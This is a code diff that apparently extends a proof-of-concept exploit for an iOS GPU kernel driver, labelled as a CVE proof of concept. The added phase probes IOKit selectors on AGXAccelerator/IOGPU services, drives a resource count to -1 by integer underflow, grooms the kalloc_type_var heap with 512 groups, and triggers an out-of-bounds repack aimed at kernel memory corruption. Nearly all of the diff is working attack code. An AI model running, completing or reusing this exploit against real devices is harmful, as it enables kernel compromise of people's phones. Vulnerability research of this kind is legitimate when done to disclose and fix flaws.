@@ -552,6 +552,139 @@ static void trigger_phase5(io_connect_t conn) {
     evf("[P5] DONE — if no panic: F-109 path not triggered by SGAR count=-1 -> check other selectors");
 }
 
+/*
+ * trigger_phase6: Find s_group_remove_resources selector and trigger F-109 via
+ * integer underflow.
+ *
+ * Strategy:
+ *   1. Create a count=4 group -> group_id G1.
+ *   2. Probe selectors 0-30 with SGAR-format struct (group_id=G1, count=1 at [+0x20]).
+ *      A selector that accepts this and decrements the resource count is REMOVE.
+ *   3. Once REMOVE found: create count=0 group G2, call REMOVE(G2, count=1) -> COUNT=-1.
+ *   4. Call SGAR(count=1) on same G2 to trigger repack (F-109 backward OOB).
+ *   5. Groom: 2048 count=15 groups so preceding element has 0x0F at bytes [12..15].
+ *   6. Watch for panic with GPR=COMMPAGE_FLAG.
+ */
+static void trigger_phase6(io_connect_t conn) {
+    evf("[P6] START: F-109 selector probe + integer underflow chain");
+
+    /* Phase 6a: Create a reference group with count=4 (for remove testing) */
+    static uint8_t ref_s[SGAR_STRUCT_SIZE];
+    uint8_t ref_out[0x10]; size_t ref_out_sz = sizeof(ref_out); uint32_t ref_cnt = 0;
+    memset(ref_s, 0, sizeof(ref_s));
+    *(uint32_t *)(ref_s + SGAR_COUNT_OFFSET) = 4;
+    /* Pack 4 valid-looking resource handles at entries[0..3] */
+    for (int i = 0; i < 4; i++)
+        *(uint32_t *)(ref_s + 0x28 + i*4) = (uint32_t)(i + 0x1000);
+    kern_return_t gkr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, ref_s, sizeof(ref_s), NULL, &ref_cnt, ref_out, &ref_out_sz);
+    uint64_t ref_gid = (gkr == 0) ? *(uint64_t *)ref_out : 0;
+    evf("[P6] REF_GROUP count=4 kr=0x%x gid=0x%llx", gkr, ref_gid);
+    if (!ref_gid) {
+        evf("[P6] ABORT: cannot create reference group");
+        return;
+    }
+
+    /* Phase 6b: Probe each selector 0-30 with SGAR-format struct containing ref_gid.
+     * We encode ref_gid at [+0x00] (group id field) and count=1 at [+0x20].
+     * A REMOVE selector would: look up group by gid, decrement count by 1. */
+    int remove_sel = -1;
+    for (int sel = 0; sel <= 30; sel++) {
+        if (sel == SGAR_SELECTOR) continue;  /* skip ADD selector */
+        static uint8_t ps[SGAR_STRUCT_SIZE];
+        uint8_t pout[0x40]; size_t poutsz = sizeof(pout); uint32_t pcnt = 0;
+        memset(ps, 0, sizeof(ps));
+        /* Try group_id in multiple common locations */
+        *(uint32_t *)(ps + 0x00) = (uint32_t)ref_gid;
+        *(uint32_t *)(ps + 0x04) = (uint32_t)(ref_gid >> 32);
+        *(uint32_t *)(ps + 0x20) = 1;  /* count=1 at SGAR_COUNT_OFFSET */
+        *(uint32_t *)(ps + 0x28) = (uint32_t)(0x1000);  /* first entry */
+        kern_return_t pkr = IOConnectCallMethod(conn, sel,
+            NULL, 0, ps, sizeof(ps), NULL, &pcnt, pout, &poutsz);
+        if (pkr == 0) {
+            evf("[P6] SEL%d STRUCT: kr=0x0 (LIVE) pcnt=%u pout[0..7]=%02x%02x%02x%02x%02x%02x%02x%02x",
+                sel, pcnt, pout[0],pout[1],pout[2],pout[3],pout[4],pout[5],pout[6],pout[7]);
+            if (remove_sel < 0) remove_sel = sel;  /* first hit = candidate REMOVE */
+        } else if (pkr != 0xe00002c2 && pkr != 0xe00002be) {
+            /* Interesting error (not generic BAD_ARGUMENT) */
+            evf("[P6] SEL%d STRUCT: kr=0x%x (interesting)", sel, pkr);
+        }
+
+        /* Also try with scalar input (just the group_id) */
+        uint64_t sc_in[2] = { ref_gid, 1 };
+        uint8_t sc_out[0x10]; size_t sc_outsz = sizeof(sc_out); uint32_t sc_cnt = 0;
+        kern_return_t skr = IOConnectCallMethod(conn, sel,
+            sc_in, 2, NULL, 0, NULL, &sc_cnt, sc_out, &sc_outsz);
+        if (skr == 0 && sel != 7) {  /* sel=7 already known */
+            evf("[P6] SEL%d SCALAR(gid,1): kr=0x0 (LIVE) sc_cnt=%u", sel, sc_cnt);
+        }
+    }
+    evf("[P6] PROBE DONE: remove_sel=%d", remove_sel);
+
+    if (remove_sel < 0) {
+        evf("[P6] REMOVE selector not found via struct probe -> try scalar overflow");
+        /* Phase 6b-fallback: use sel=7 scalar + repeated calls to underflow.
+         * sel=7 baseline returns kr=0 on valid groups. Try calling it many times
+         * to see if it decrements an internal counter. */
+        /* Create a fresh count=0 group */
+        uint64_t g0 = try_sgar_q(conn, 0);
+        evf("[P6] G0 (count=0): gid=0x%llx", g0);
+        if (!g0) { evf("[P6] ABORT: cannot create G0"); return; }
+        /* Call sel=7 100 times on G0 */
+        int ok7 = 0;
+        for (int i = 0; i < 100; i++) {
+            kern_return_t r7 = try_sel7_q(conn, (uint32_t)g0);
+            if (r7 == 0) ok7++;
+        }
+        evf("[P6] SEL7 x100 on G0: %d/100 kr=0", ok7);
+        return;
+    }
+
+    /* Phase 6c: F-109 integer underflow chain */
+    evf("[P6] REMOVE selector found: sel=%d — attempting integer underflow", remove_sel);
+
+    /* Groom: create 512 count=15 groups to fill kalloc_type_var with
+     * elements that have 0x0000000F at bytes [12..15] */
+    uint32_t groom6[512];
+    int g6_valid = 0;
+    for (int gi = 0; gi < 512; gi++) {
+        uint64_t g = try_sgar_q(conn, 15);
+        if (g) groom6[g6_valid++] = (uint32_t)g;
+    }
+    evf("[P6] GROOM: %d/512 count=15 groups (kalloc_type_var)", g6_valid);
+
+    /* Create a count=0 target group (G_zero), then remove 1 -> COUNT=-1 */
+    uint64_t g_zero = try_sgar_q(conn, 0);
+    evf("[P6] G_ZERO (count=0): gid=0x%llx", g_zero);
+    if (!g_zero) { evf("[P6] ABORT: cannot create G_ZERO"); return; }
+
+    /* Remove count=1 from G_ZERO (which has 0 resources) -> integer underflow to -1 */
+    static uint8_t rm_s[SGAR_STRUCT_SIZE];
+    uint8_t rm_out[0x10]; size_t rm_out_sz = sizeof(rm_out); uint32_t rm_cnt = 0;
+    memset(rm_s, 0, sizeof(rm_s));
+    *(uint32_t *)(rm_s + 0x00) = (uint32_t)g_zero;
+    *(uint32_t *)(rm_s + 0x04) = (uint32_t)(g_zero >> 32);
+    *(uint32_t *)(rm_s + 0x20) = 1;  /* remove count=1 */
+    *(uint32_t *)(rm_s + 0x28) = 0x1000;  /* dummy handle */
+    kern_return_t rm_kr = IOConnectCallMethod(conn, remove_sel,
+        NULL, 0, rm_s, sizeof(rm_s), NULL, &rm_cnt, rm_out, &rm_out_sz);
+    evf("[P6] REMOVE(G_ZERO, count=1) kr=0x%x -> COUNT should be -1", rm_kr);
+
+    /* Now call ADD(G_ZERO, count=1) again to trigger repack with COUNT=-1 */
+    static uint8_t add2_s[SGAR_STRUCT_SIZE];
+    uint8_t add2_out[0x10]; size_t add2_out_sz = sizeof(add2_out); uint32_t add2_cnt = 0;
+    memset(add2_s, 0, sizeof(add2_s));
+    *(uint32_t *)(add2_s + 0x00) = (uint32_t)g_zero;   /* existing group_id */
+    *(uint32_t *)(add2_s + 0x04) = (uint32_t)(g_zero >> 32);
+    *(uint32_t *)(add2_s + SGAR_COUNT_OFFSET) = 1;     /* add 1 resource */
+    *(uint32_t *)(add2_s + 0x28) = 0x2000;             /* resource handle */
+    kern_return_t add2_kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, add2_s, sizeof(add2_s), NULL, &add2_cnt, add2_out, &add2_out_sz);
+    evf("[P6] ADD(G_ZERO, count=1) -> REPACK trigger: kr=0x%x", add2_kr);
+
+    evf("[P6] DONE — if panic with GPR=0x%016llx: F-109 chain confirmed -> F-74", COMMPAGE_FLAG);
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -754,6 +887,31 @@ void run_cve28882_poc(UIWindow *window) {
                     trigger_phase5(conn5);
                     IOServiceClose(conn5);
                     evf("[P5] CONN5 closed");
+
+                    /* Phase 6: F-109 integer underflow via selector probe */
+                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                                   dispatch_get_main_queue(), ^{
+                        mach_port_t mp6 = 0;
+                        IOMasterPort(MACH_PORT_NULL, &mp6);
+                        io_connect_t conn6 = 0;
+                        const char *svc6[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+                        for (int si6 = 0; svc6[si6] && !conn6; si6++) {
+                            io_service_t svc6s = IOServiceGetMatchingService(
+                                kIOMainPortDefault, IOServiceMatching(svc6[si6]));
+                            if (svc6s) {
+                                IOServiceOpen(svc6s, mach_task_self(), 1, &conn6);
+                                IOObjectRelease(svc6s);
+                            }
+                        }
+                        if (conn6) {
+                            evf("[P6] CONN6 ready=0x%x", conn6);
+                            trigger_phase6(conn6);
+                            IOServiceClose(conn6);
+                            evf("[P6] CONN6 closed");
+                        } else {
+                            evf("[P6] CONN6 failed: cannot open for Phase 6");
+                        }
+                    });
                 } else {
                     evf("[P5] CONN5 failed: cannot open for Phase 5");
                 }
